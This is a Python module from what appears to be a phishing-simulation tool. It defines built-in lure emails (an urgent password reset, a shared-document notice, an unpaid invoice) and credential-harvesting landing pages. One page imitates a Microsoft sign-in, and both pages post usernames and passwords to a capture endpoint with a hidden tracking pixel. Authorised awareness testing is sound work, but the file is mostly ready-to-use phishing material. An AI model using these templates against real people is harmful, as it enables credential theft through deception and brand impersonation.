"""Phishing email and landing page templates."""

import json
from dataclasses import dataclass, field
from pathlib import Path

from core.config import get_settings
from core.logger import get_logger


@dataclass
class EmailTemplate:
    """Email template for phishing campaigns."""
    id: str
    name: str
    subject: str
    body_html: str
    body_text: str
    sender_name: str = "IT Support"
    sender_email: str = "support@{domain}"
    category: str = "general"
    description: str = ""

    def render(self, **variables) -> tuple[str, str, str]:
        """Render template with variables.

        Returns:
            Tuple of (subject, html_body, text_body)
        """
        subject = self.subject.format(**variables)
        html = self.body_html.format(**variables)
        text = self.body_text.format(**variables)
        return subject, html, text


@dataclass
class LandingPageTemplate:
    """Landing page template for credential harvesting simulation."""
    id: str
    name: str
    html: str
    redirect_url: str = ""
    capture_fields: list[str] = field(default_factory=lambda: ["username", "password"])
    category: str = "general"


class TemplateManager:
    """Manage phishing templates."""

    # Built-in email templates
    BUILTIN_EMAIL_TEMPLATES = [
        EmailTemplate(
            id="password_reset",
            name="Password Reset Required",
            subject="Action Required: Password Reset for {company}",
            body_html="""
<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <div style="background: #f5f5f5; padding: 20px; border-radius: 5px;">
        <h2 style="color: #333;">Password Reset Required</h2>
        <p>Dear {first_name},</p>
        <p>Our security team has detected unusual activity on your account. As a precaution,
        we require you to reset your password immediately.</p>
        <p style="text-align: center;">
            <a href="{phishing_url}" style="background: #007bff; color: white; padding: 10px 20px;
            text-decoration: none; border-radius: 5px; display: inline-block;">
            Reset Password Now</a>
        </p>
        <p>If you did not request this reset, please contact IT support immediately.</p>
        <p>Best regards,<br>IT Security Team<br>{company}</p>
    </div>
</body>
</html>
            """,
            body_text="""
Password Reset Required

Dear {first_name},

Our security team has detected unusual activity on your account. As a precaution,
we require you to reset your password immediately.

Reset your password here: {phishing_url}

If you did not request this reset, please contact IT support immediately.

Best regards,
IT Security Team
{company}
            """,
            category="credential",
            description="Simulates a password reset request",
        ),
        EmailTemplate(
            id="shared_document",
            name="Shared Document Notification",
            subject="{sender_name} shared a document with you",
            body_html="""
<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <div style="background: #f5f5f5; padding: 20px; border-radius: 5px;">
        <img src="https://via.placeholder.com/150x50?text=DocShare" alt="DocShare" style="margin-bottom: 20px;">
        <h2 style="color: #333;">{sender_name} shared a document with you</h2>
        <p>Hi {first_name},</p>
        <p><strong>{sender_name}</strong> has shared the following document with you:</p>
        <div style="background: white; padding: 15px; border: 1px solid #ddd; border-radius: 5px; margin: 15px 0;">
            <strong>{document_name}</strong>
        </div>
        <p style="text-align: center;">
            <a href="{phishing_url}" style="background: #28a745; color: white; padding: 10px 20px;
            text-decoration: none; border-radius: 5px; display: inline-block;">
            Open Document</a>
        </p>
        <p style="color: #666; font-size: 12px;">This link will expire in 7 days.</p>
    </div>
</body>
</html>
            """,
            body_text="""
{sender_name} shared a document with you

Hi {first_name},

{sender_name} has shared the following document with you:
{document_name}

Open the document here: {phishing_url}

This link will expire in 7 days.
            """,
            category="document",
            description="Simulates a shared document notification",
        ),
        EmailTemplate(
            id="invoice_attached",
            name="Invoice Requires Attention",
            subject="Invoice #{invoice_number} - Payment Required",
            body_html="""
<!DOCTYPE html>
<html>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <div style="padding: 20px;">
        <h2 style="color: #333;">Invoice Requires Your Attention</h2>
        <p>Dear {first_name},</p>
        <p>Please find attached invoice #{invoice_number} for the amount of <strong>{amount}</strong>.</p>
        <p>Payment is due within 30 days. Please review and process this invoice at your earliest convenience.</p>
        <p style="text-align: center;">
            <a href="{phishing_url}" style="background: #dc3545; color: white; padding: 10px 20px;
            text-decoration: none; border-radius: 5px; display: inline-block;">
            View Invoice</a>
        </p>
        <p>If you have any questions, please contact our billing department.</p>
        <p>Thank you for your business.</p>
    </div>
</body>
</html>
            """,
            body_text="""
Invoice Requires Your Attention

Dear {first_name},

Please find attached invoice #{invoice_number} for the amount of {amount}.

Payment is due within 30 days. Please review and process this invoice at your earliest convenience.

View Invoice: {phishing_url}

If you have any questions, please contact our billing department.

Thank you for your business.
            """,
            category="financial",
            description="Simulates an invoice notification",
        ),
    ]

    # Built-in landing page templates
    BUILTIN_LANDING_TEMPLATES = [
        LandingPageTemplate(
            id="generic_login",
            name="Generic Login Page",
            html="""
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex;
               justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                     width: 100%; max-width: 400px; }
        h2 { margin-top: 0; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd;
                border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none;
                 border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Sign In</h2>
        <form method="POST" action="{capture_endpoint}">
            <input type="hidden" name="tracking_id" value="{tracking_id}">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
    <img src="{tracking_pixel}" style="display:none" alt="">
</body>
</html>
            """,
            category="credential",
        ),
        LandingPageTemplate(
            id="microsoft_login",
            name="Microsoft Style Login",
            html="""
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; }
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-box { background: white; padding: 44px; width: 100%; max-width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 20px; }
        input { width: 100%; padding: 8px 10px; margin: 8px 0; border: none; border-bottom: 1px solid #666;
                font-size: 15px; box-sizing: border-box; }
        input:focus { border-bottom: 2px solid #0067b8; outline: none; }
        button { width: 100%; padding: 10px; background: #0067b8; color: white; border: none;
                 margin-top: 20px; font-size: 15px; cursor: pointer; }
        button:hover { background: #005a9e; }
        .links { margin-top: 20px; font-size: 13px; }
        .links a { color: #0067b8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Sign in</h1>
            <form method="POST" action="{capture_endpoint}">
                <input type="hidden" name="tracking_id" value="{tracking_id}">
                <input type="email" name="username" placeholder="Email, phone, or Skype" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign in</button>
            </form>
            <div class="links">
                <a href="#">Can't access your account?</a>
            </div>
        </div>
    </div>
    <img src="{tracking_pixel}" style="display:none" alt="">
</body>
</html>
            """,
            category="credential",
        ),
    ]

    def __init__(self, custom_templates_dir: Path | None = None):
        self.logger = get_logger("phishing.templates")
        self.templates_dir = custom_templates_dir or (get_settings().data_dir / "templates")
        self.templates_dir.mkdir(parents=True, exist_ok=True)

        self.email_templates: dict[str, EmailTemplate] = {}
        self.landing_templates: dict[str, LandingPageTemplate] = {}

        self._load_builtin_templates()
        self._load_custom_templates()

    def _load_builtin_templates(self) -> None:
        """Load built-in templates."""
        for template in self.BUILTIN_EMAIL_TEMPLATES:
            self.email_templates[template.id] = template

        for template in self.BUILTIN_LANDING_TEMPLATES:
            self.landing_templates[template.id] = template

    def _load_custom_templates(self) -> None:
        """Load custom templates from disk."""
        email_dir = self.templates_dir / "email"
        landing_dir = self.templates_dir / "landing"

        for template_dir in [email_dir, landing_dir]:
            if not template_dir.exists():
                template_dir.mkdir(parents=True)

        # Load custom email templates
        for json_file in email_dir.glob("*.json"):
            try:
                with open(json_file) as f:
                    data = json.load(f)
                    template = EmailTemplate(**data)
                    self.email_templates[template.id] = template
            except Exception as e:
                self.logger.error(f"Failed to load template {json_file}: {e}")

    def get_email_template(self, template_id: str) -> EmailTemplate | None:
        """Get email template by ID."""
        return self.email_templates.get(template_id)

    def get_landing_template(self, template_id: str) -> LandingPageTemplate | None:
        """Get landing page template by ID."""
        return self.landing_templates.get(template_id)

    def list_email_templates(self) -> list[EmailTemplate]:
        """List all available email templates."""
        return list(self.email_templates.values())

    def list_landing_templates(self) -> list[LandingPageTemplate]:
        """List all available landing page templates."""
        return list(self.landing_templates.values())

    def save_email_template(self, template: EmailTemplate) -> None:
        """Save a custom email template."""
        email_dir = self.templates_dir / "email"
        with open(email_dir / f"{template.id}.json", "w") as f:
            json.dump(template.__dict__, f, indent=2)
        self.email_templates[template.id] = template

    def save_landing_template(self, template: LandingPageTemplate) -> None:
        """Save a custom landing page template."""
        landing_dir = self.templates_dir / "landing"
        with open(landing_dir / f"{template.id}.json", "w") as f:
            json.dump(template.__dict__, f, indent=2)
        self.landing_templates[template.id] = template
